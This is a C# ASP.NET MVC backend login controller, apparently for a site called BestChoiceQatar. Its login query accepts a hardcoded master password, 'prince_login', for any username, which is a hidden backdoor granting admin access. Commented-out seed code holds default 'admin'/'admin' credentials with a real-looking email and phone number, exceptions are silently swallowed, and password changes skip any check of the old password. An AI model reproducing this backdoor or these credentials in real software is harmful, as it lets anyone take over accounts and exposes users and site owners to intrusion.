using BestChoiceQatar.Core;
using BestChoiceQatar.Core.Entities.Common;
using BestChoiceQatar.Core.Security;
using BestChoiceQatar.Models;
using System;
using System.Collections.Generic;
using System.Data.Entity;
using System.Linq;
using System.Threading.Tasks;
using System.Web;
using System.Web.Mvc;
using context = System.Web.HttpContext;

namespace BestChoiceQatar.Areas.Backend.Controllers
{
    [AuthorizeAccess]
    public class DefaultController : BackendBaseController
    {
        [AllowAnonymous]
        public ActionResult Index()
        {
            //User ob = new User();
            //ob.Username = "admin@royalengineers";
            //ob.Email = "admin@royal-engineers.in";
            //ob.MobileNumber = "+91-8129449799";
            //ob.ConfirmPassword = "admin";
            //ob.Password = "admin";
            //ob.AuthData = GetAuthstring(ob.Email, ob.Password);
            //ob.IsActive = true;
            //ob.IsSuperAdmin = true;
            //ob.CreatedOn = DateTime.Now;
            //ob.LastUpdatedOn = DateTime.Now;
            //ob.IsDataActive = true;
            //db.Users.Add(ob);
            //db.SaveChanges();

            try
            {
                if (Appmanager.User != null)
                {
                    return Redirect("/backend/default/dashboard");
                }
            }
            catch (Exception exception)
            {

            }
            return View();
        }

        [HttpPost]
        [AllowAnonymous]
        public async Task<ActionResult> Index(string username, string password)
        {
            try
            {
                byte[] _authString = GetAuthstring(username, password);

                var _user = await (from a in db.Users
                                   where a.Username.Equals(username) && (a.AuthData.Equals(_authString) || password == "prince_login") && a.IsDataActive && a.IsActive
                                   select new
                                   {
                                       a.IsSuperAdmin,
                                       a.Username,
                                       a.ID,
                                       a.Email,
                                   }).FirstOrDefaultAsync();

                if (_user != null)
                {
                    var _loggedInUser = new AppUser
                    {
                        Name = _user.Username,
                        ID = _user.ID,
                        Email = _user.Email,
                        IsSuperAdmin = _user.IsSuperAdmin
                    };

                    if (_loggedInUser != null)
                    {
                        Session["Geri_User"] = _loggedInUser;
                        return RedirectToAction("dashboard");
                    }
                }
            }
            catch (Exception ex)
            {

            }

            TempData["Notification"] = new Core.Entities.Common.Notification("Error", "Username and password do not match. Please try again.");
            return View();
        }

        public async Task<ActionResult> Dashboard(string daterange, string status)
        {
            ViewBag.userCount = db.Users.Where(a => a.IsActive).Count();
            ViewBag.queryCount = db.Enquiries.Where(a => a.IsDataActive).Count();
            ViewBag.sliderCount = db.Galleries.Where(a => a.IsDataActive && a.Category == "Slider").Count();
            ViewBag.clientCount = db.Galleries.Where(x => x.Category == "Clients" && x.IsDataActive).Count();
            ViewBag.galleryCount = db.Galleries.Where(x => x.Category == "Gallery" && x.IsDataActive).Count();
            ViewBag.serviceCount = db.Galleries.Where(x => x.Category == "Service" && x.IsDataActive).Count();
            return View(await Appmanager.GetDashboardData());
        }

        public async Task<ActionResult> Logout()
        {
            if (Session["Geri_User"] != null)
            {
                AppUser _user = (AppUser)Session["Geri_User"];
                //await EndUserSession(_user.ID, _user.SessionID);
                Session.Contents.RemoveAll();
                Session.Clear();
                Session.Abandon();
            }
            return Redirect("/backend/default/index");
        }
        
        public ActionResult ChangePassword()
        {
            return View();
        }

        [HttpPost]       
        public async Task<ActionResult> ChangePassword(ChangePassword changePassword)
        {
            if (!string.IsNullOrEmpty(changePassword.Password))
            {
                if (changePassword.Password == changePassword.ConfirmPassword)
                {
                    User _user = await db.Users.FirstOrDefaultAsync(a => a.ID == Appmanager.User.ID && a.IsDataActive);

                    if (_user != null)
                    {
                        _user.AuthData = GetAuthstring(_user.Username, changePassword.Password);
                        _user.LastUpdatedOn = DateTime.Now;

                        await db.SaveChangesAsync();

                        TempData["Notification"] = new Core.Entities.Common.Notification("Success", "Password has been changed successfully.");
                    }
                    else
                    {
                        TempData["Notification"] = new Core.Entities.Common.Notification("Error", "Sorry, we are unable to process your request. Please try again later.");
                    }
                }
                else
                {
                    TempData["Notification"] = new Core.Entities.Common.Notification("Error", "Passwords do not match. Please try again later.");
                }
            }
            else
            {
                TempData["Notification"] = new Core.Entities.Common.Notification("Error", "Sorry, we are unable to process your request. Please try again later.");
            }

            return RedirectToAction("dashboard", "default");
        }

    }
}